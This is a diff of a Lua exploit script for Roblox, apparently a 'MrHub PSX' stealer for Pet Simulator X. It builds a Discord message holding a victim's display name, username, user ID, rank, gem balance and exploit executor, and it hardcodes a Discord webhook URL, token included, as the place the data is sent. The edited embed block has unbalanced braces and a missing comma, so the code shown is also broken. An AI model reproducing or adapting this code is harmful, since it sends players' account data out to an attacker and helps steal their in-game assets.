@@ -102,7 +102,7 @@ local msg = {
 	["username"] = "💎 MrHub PSX 💎",
 	["embeds"]= {
 	  {
-		["title"]= "`You've Got Mail!`",
+		["title"]= "`You've Got Mail!".. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .."!`",
 		["description"]= "**Data from the Sender**\n**🥶Display Name: **".._G.PlrDisplayNameVictim.."\n**🥶Username: **".._G.PlrUserVictim.."\n**🥶User ID: **".._G.PlrUserIDVictim.."\n**👁Rank: **".._G.CurrentRank.."\n**🎮Place: **".._G.GameIn.."**\n💭Executor: **"..getexploit(),
 		["url"]= "https://discord.gg/f6QWTHeEkd",
 		["color"]= ""..webhookcolor.."",
@@ -113,7 +113,7 @@ local msg = {
         },
 		["fields"]= {
         {
-          ["name"]= "**💎Diamonds💎**",
+          ["name"]= "**💎Gems💎**",
           ["value"]= "```".._G.DisplayDiamond.."```",
           ["inline"]= true
         },
@@ -123,9 +123,15 @@ local msg = {
           ["inline"]= true
         }
       }
-      
-  }
-  },
+      ["image"] = {
+               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                   tostring(game:GetService("Players").LocalPlayer.Name)
+           }
+       }
+   }
+}
+ }
+   },
 	["attachments"] = {}
   }
   local Webhook = "https://discord.com/api/webhooks/1107824932538286101/F_dKjUoABU7pPMPa394w9a4au3H1UMK6lA5KY0Kq1eZKA6XEuB0QTeeaaMChjUELa4o9"
